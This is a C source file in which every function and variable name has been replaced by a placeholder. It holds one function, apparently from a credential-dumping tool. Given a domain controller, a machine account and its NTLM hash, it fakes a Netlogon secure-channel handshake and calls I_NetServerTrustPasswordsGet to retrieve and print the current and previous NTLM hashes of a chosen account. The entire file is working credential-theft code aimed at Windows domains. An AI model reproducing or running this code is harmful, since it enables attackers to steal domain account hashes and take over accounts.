
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_12__ TYPE_2__ ;
typedef struct TYPE_11__ TYPE_1__ ;


typedef int wchar_t ;
typedef int sessionKey ;
typedef int ntlmHash ;
typedef int i ;
struct TYPE_12__ {int digest; } ;
struct TYPE_11__ {char member_0; char member_1; char member_2; char member_3; char member_4; char member_5; char member_6; char member_7; size_t* data; } ;
typedef int* PDWORD64 ;
typedef int * PCWCHAR ;
typedef int PBYTE ;
typedef int NT_OWF_PASSWORD ;
typedef scalar_t__ NTSTATUS ;
typedef TYPE_1__ NETLOGON_CREDENTIAL ;
typedef int NETLOGON_AUTHENTICATOR ;
typedef TYPE_2__ MD5_CTX ;
typedef int LPCBYTE ;
typedef int LPBYTE ;
typedef int LOGONSRV_HANDLE ;
typedef int ENCRYPTED_NT_OWF_PASSWORD ;
typedef size_t DWORD ;
typedef int BYTE ;


 size_t FUNC_0 (int *) ;
 int VAR_0 ;
 scalar_t__ FUNC_1 (int ,int *,int ,int *,TYPE_1__*,TYPE_1__*,size_t*) ;
 scalar_t__ FUNC_2 (int ,int *,TYPE_1__*,TYPE_1__*) ;
 scalar_t__ FUNC_3 (int ,int *,int ,int *,int *,int *,int *,int *) ;
 int VAR_1 ;
 int FUNC_4 (TYPE_2__*) ;
 int FUNC_5 (TYPE_2__*) ;
 int FUNC_6 (TYPE_2__*,size_t*,int) ;
 int VAR_2 ;
 int * VAR_3 ;
 scalar_t__ FUNC_7 (scalar_t__) ;
 int FUNC_8 (char*,...) ;
 int FUNC_9 (int ,int *,int ) ;
 scalar_t__ FUNC_10 (size_t*,size_t*,int) ;
 scalar_t__ VAR_4 ;
 scalar_t__ VAR_5 ;
 int VAR_6 ;
 int FUNC_11 (char*,...) ;
 int FUNC_12 (TYPE_1__*,int,int *,int *) ;
 int FUNC_13 (int ,int ,int *) ;
 int * VAR_7 ;
 scalar_t__ FUNC_14 (int ,int *,int,int ,int,int *,int) ;
 scalar_t__ FUNC_15 (int,int **,char*,int **,int *) ;
 scalar_t__ FUNC_16 (int *,int *,int) ;
 int FUNC_17 (int *,int,int ) ;

NTSTATUS FUNC_18(int VAR_8, wchar_t * VAR_9[])
{
 NTSTATUS VAR_10;
 NETLOGON_CREDENTIAL VAR_11 = {'-', '\\', '|', '/', '-', '\\', '|', '/'}, VAR_12, VAR_13, VAR_14, VAR_15;
 NETLOGON_AUTHENTICATOR VAR_16, VAR_17;
 BYTE VAR_18[VAR_1], VAR_19[VAR_2];
 DWORD VAR_20 = 0, VAR_21 = 0x600FFFFF;
 MD5_CTX VAR_22;
 ENCRYPTED_NT_OWF_PASSWORD VAR_23, VAR_24;
 NT_OWF_PASSWORD VAR_25, VAR_26;
 PCWCHAR VAR_27, VAR_28, VAR_29, VAR_30, VAR_31;

 if(FUNC_15(VAR_8, VAR_9, L"dc", &VAR_27, ((void*)0)))
 {
  if(FUNC_15(VAR_8, VAR_9, L"user", &VAR_29, ((void*)0)))
  {
   FUNC_15(VAR_8, VAR_9, L"account", &VAR_31, VAR_29);
   FUNC_15(VAR_8, VAR_9, L"computer", &VAR_28, VAR_3);
   if(FUNC_15(VAR_8, VAR_9, L"ntlm", &VAR_30, ((void*)0)))
   {
    if(FUNC_16(VAR_30, VAR_18, sizeof(VAR_18)))
    {

     VAR_10 = FUNC_2((LOGONSRV_HANDLE) VAR_27, (wchar_t *) VAR_28, &VAR_11, &VAR_12);
     if(FUNC_7(VAR_10))
     {

      FUNC_5(&VAR_22);
      FUNC_6(&VAR_22, &VAR_20, sizeof(VAR_20));
      FUNC_6(&VAR_22, VAR_11.data, sizeof(VAR_11.data));
      FUNC_6(&VAR_22, VAR_12.data, sizeof(VAR_12.data));
      FUNC_4(&VAR_22);
      if(FUNC_14(VAR_0, VAR_18, sizeof(VAR_18), VAR_22.digest, sizeof(VAR_22.digest), VAR_19, sizeof(VAR_19)))
      {

       FUNC_13((PBYTE) VAR_11.data, (PBYTE) VAR_14.data, VAR_19);
       FUNC_13((PBYTE) VAR_12.data, (PBYTE) VAR_13.data, VAR_19);



       VAR_10 = FUNC_1((LOGONSRV_HANDLE) VAR_27, (wchar_t *) VAR_29, VAR_6, (wchar_t *) VAR_28, &VAR_14, &VAR_15, &VAR_21);
       if(FUNC_7(VAR_10))
       {

        if(FUNC_10(VAR_13.data, VAR_15.data, sizeof(VAR_13.data)))
        {

         for(VAR_10 = VAR_4, VAR_20 = 0; (VAR_10 == VAR_4) && (VAR_20 < FUNC_0(VAR_7)); VAR_20++)
         {
          FUNC_12(&VAR_14, 0x10, &VAR_16, VAR_19);

          VAR_10 = FUNC_3((LOGONSRV_HANDLE) VAR_27, (wchar_t *) VAR_31, VAR_7[VAR_20], (wchar_t *) VAR_28, &VAR_16, &VAR_17, &VAR_23, &VAR_24);
          if(FUNC_7(VAR_10))
          {
           FUNC_11(L"  Account: %s\n", VAR_31);
           FUNC_9((LPCBYTE) &VAR_23, VAR_19, (LPBYTE) &VAR_25);
           FUNC_9((LPCBYTE) &VAR_24, VAR_19, (LPBYTE) &VAR_26);
           FUNC_11(L"  NTLM   : "); FUNC_17(&VAR_25, VAR_1, 0); FUNC_11(L"\n");
           FUNC_11(L"  NTLM-1 : "); FUNC_17(&VAR_26, VAR_1, 0); FUNC_11(L"\n");
          }
          *(PDWORD64) VAR_14.data += 1;
         }
         if(!FUNC_7(VAR_10))
          FUNC_8(L"I_NetServerTrustPasswordsGet (0x%08x)\n", VAR_10);
        }
        else FUNC_8(L"ServerCredential does not match CandidateServerCredential\n");
       }
       else FUNC_8(L"I_NetServerAuthenticate2 (0x%08x)\n", VAR_10);
      }
     }
     else FUNC_8(L"I_NetServerReqChallenge (0x%08x)\n", VAR_10);
    }
    else FUNC_8(L"ntlm hash/rc4 key length must be 32 (16 bytes)\n");
   }
   else FUNC_8(L"Missing argument : ntlm\n");
  }
  else FUNC_8(L"Missing argument : user\n");
 }
 else FUNC_8(L"Missing argument : dc\n");
 return VAR_5;
}
